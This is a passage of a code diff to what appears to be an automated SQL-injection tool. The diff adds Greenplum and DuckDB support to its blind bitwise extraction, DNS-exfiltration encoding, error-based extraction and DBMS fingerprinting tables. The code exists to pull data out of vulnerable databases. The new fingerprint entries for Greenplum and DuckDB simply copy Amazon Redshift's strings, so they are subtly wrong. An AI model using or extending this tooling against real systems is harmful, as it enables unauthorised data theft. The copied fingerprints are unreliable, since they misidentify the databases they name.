         # BUG-REQ10-ORACLE-NULL FIX: Oracle ASCII() returns NULL when SUBSTR() returns
         # empty string (pos > string length).  Without NVL wrapper, NULL & mask = NULL
         # (not 0) → oracle treats as False → all bits = 0 → extraction returns NUL bytes.
@@ -182389,6 +183236,8 @@ class BatchedCharExtractor:
         # Numeric safety: CHAR_RANGE values are binary-search loop bounds only; they are
         # never placed inside SQL string delimiters or comparison operands.
         "Amazon Redshift": (0, 1114111),  # PG-compat: ASCII() returns 0..U+10FFFF
+        "Greenplum": (0, 1114111),  # PG-compat: ASCII() returns 0..U+10FFFF
+        "DuckDB": (0, 1114111),  # PG-compat: ASCII() returns 0..U+10FFFF
     }
     
     def __init__(self, eval_fn, dbms: str = "MySQL", gate=None):
@@ -182910,7 +183759,7 @@ class BitwiseExtractorSimple:
                        else 21 if self._dbms in ("SQLite", "MySQL", "MariaDB",
                                                   "TiDB", "PostgreSQL",
                                                   "CockroachDB", "YugabyteDB",
-                                                  "Amazon Redshift")  # BUG-V139-BWE-AMZN-REDSHIFT-BITS FIX
+                                                  "Amazon Redshift", "Greenplum", "DuckDB")  # BUG-V139-BWE-AMZN-REDSHIFT-BITS FIX
                        else 8)
         tasks = [_probe_bit(b) for b in range(_bwe_n_bits)]
         # BUG-7-FIX (Req 9): Throttle the asyncio.gather via module-level extraction semaphore.
@@ -183087,6 +183936,8 @@ class DNSExfilExtractor:
         "YugabyteDB":     "encode(({expr})::bytea,$$hex$$)",
         # Redshift supports encode(bytea,'hex') via PG compat.
         "Amazon Redshift": "encode(({expr})::bytea,$$hex$$)",
+        "Greenplum": "encode(({expr})::bytea,$$hex$$)",
+        "DuckDB": "encode(({expr})::bytea,$$hex$$)",
     }
     
     def __init__(self, engine, config, method, url, data, data_fmt, param, original,
@@ -183997,7 +184848,7 @@ class ErrorBasedExtractor:
         # self.CAST_TEMPLATES.get("TiDB", []) → empty list → return None immediately.
         # TiDB is MySQL-wire-compatible and supports EXTRACTVALUE() and UPDATEXML()
         # identically to MySQL. Use MySQL templates.
-        _pg_compat = {"CockroachDB", "YugabyteDB", "Amazon Redshift"}
+        _pg_compat = {"CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"}
         _mysql_compat = {"MariaDB", "TiDB"}  # TiDB is MySQL-wire-compat: supports EXTRACTVALUE/UPDATEXML
         if dbms in _pg_compat:
             templates = self.CAST_TEMPLATES.get("PostgreSQL", [])
@@ -184177,6 +185028,8 @@ class ErrorBasedExtractor:
             "CockroachDB":    {"version": "version()", "database": "current_database()", "user": "current_user"},
             "YugabyteDB":     {"version": "yb_server_version()", "database": "current_database()", "user": "current_user"},
             "Amazon Redshift": {"version": "version()", "database": "current_database()", "user": "current_user"},
+            "Greenplum": {"version": "version()", "database": "current_database()", "user": "current_user"},
+            "DuckDB": {"version": "version()", "database": "current_database()", "user": "current_user"},
             "MSSQL": {"version": "@@VERSION", "database": "DB_NAME()", "user": "SYSTEM_USER"},
             "Oracle": {"version": "(SELECT BANNER FROM v$version WHERE ROWNUM=1)", "user": "USER"},
             "SQLite": {"version": "sqlite_version()"},
@@ -184200,6 +185053,8 @@ class ErrorBasedExtractor:
             "CockroachDB":     "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
             "YugabyteDB":      "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
             "Amazon Redshift": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
+            "Greenplum": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
+            "DuckDB": "(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')",
             "MSSQL":    "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)",
         }
         _tq = _table_exprs.get(dbms)
@@ -184489,6 +185344,8 @@ class DBMSEliminator:
         "CockroachDB":    ["crdb_internal", "cockroach", "cockroachdb"],
         "YugabyteDB":     ["yugabyte", "yb_server_version", "yugabytedb"],
         "Amazon Redshift": ["amazon redshift", "redshift", "padb_harvest"],
+        "Greenplum": ["amazon redshift", "redshift", "padb_harvest"],
+        "DuckDB": ["amazon redshift", "redshift", "padb_harvest"],
     }
     
     def __init__(self):
